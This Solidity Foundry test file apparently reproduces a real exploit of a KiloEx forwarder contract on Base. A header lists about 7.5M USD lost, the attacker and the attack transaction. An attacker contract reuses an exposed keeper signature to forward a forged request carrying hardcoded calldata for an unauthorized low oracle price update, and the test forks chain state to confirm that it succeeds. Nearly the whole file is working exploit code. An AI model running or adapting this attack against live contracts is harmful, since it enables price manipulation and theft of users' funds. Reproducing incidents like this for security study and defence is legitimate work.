// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

// @KeyInfo - Total Lost: ~7.5M USD
// Attacker: https://basescan.org/address/0x00fac92881556a90fdb19eae9f23640b95b4bcbd
// Attack Tx: https://basescan.org/tx/0x6b378c84aa57097fb5845f285476e33d6832b8090d36d02fe0e1aed909228edd
// Vulnerable Contract: https://basescan.org/address/0x3274b668aed85479e2a8511e74d7db7240ebe7c8
//
// The forwarder accepted an exposed keeper signature for attacker-controlled
// request data. A fresh attacker contract can therefore submit an unauthorized
// oracle update while impersonating the keeper.

interface IKiloForwarder {
    struct ForwardRequest {
        address from;
        address to;
        uint256 value;
        uint256 gas;
        uint256 nonce;
        bytes data;
    }

    function execute(
        ForwardRequest calldata req,
        bytes calldata signature
    ) external returns (bool success, bytes memory);
    function verify(
        ForwardRequest calldata req,
        bytes calldata signature
    ) external view returns (bool);
}

contract KiloExAttacker {
    IKiloForwarder private constant FORWARDER = IKiloForwarder(0x3274b668AED85479E2A8511E74d7dB7240eBe7C8);
    address private constant KEEPER = 0x551f3110f12c763D1611d5A63B5F015d1c1a954C;
    address private constant POSITION_KEEPER = 0xfdc7bc3A9FdE88E7Bcfb69c8b9cA7FDA483627eD;

    function attack() external returns (bool success) {
        IKiloForwarder.ForwardRequest memory request = IKiloForwarder.ForwardRequest({
            from: KEEPER, to: POSITION_KEEPER, value: 0, gas: 1_000_000, nonce: 0, data: _lowPriceUpdate()
        });

        bytes memory exposedKeeperSignature =
            hex"f541a5f47fb3c06b5d73d34ebe4c6017b279914db30fbe2cb8333c049874ca9f1787e9d3cc73629e067d30f4163936ab9fab92fc88650a53f0398c88e4383a0a1c";

        require(FORWARDER.verify(request, exposedKeeperSignature), "forged request rejected");
        (success,) = FORWARDER.execute(request, exposedKeeperSignature);
    }

    function _lowPriceUpdate() private pure returns (bytes memory) {
        return hex"ac9fd27900000000000000000000000000000000000000000000000000000000000000e00000000000000000000000000000000000000000000000000000000000000120000000000000000000000000000000000000000000000000000000000000016000000000000000000000000000000000000000000000000000000000000001a000000000000000000000000000000000000000000000000000000000000001e00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000febc112dc9ead92159b4cfb1c504ab31d8c2746300000000000000000000000000000000000000000000000000000000000000010000000000000000000000009ef1b8c0e4f7dc8bf5719ea496883dc6401d5b2e000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000640000000000000000000000000000000000000000000000000000000000000001000000000000000000000000d649a0876453fc7626569b28e364262192874e180000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
    }
}

contract KiloExExploitTest is Test {
    uint256 private constant FORK_BLOCK = 28_933_729;

    function setUp() public {
        vm.createSelectFork("https://base.drpc.org", FORK_BLOCK);
    }

    function testExploit() public {
        KiloExAttacker attacker = new KiloExAttacker();

        bool unauthorizedPriceUpdateSucceeded = attacker.attack();

        assertTrue(unauthorizedPriceUpdateSucceeded);
    }
}
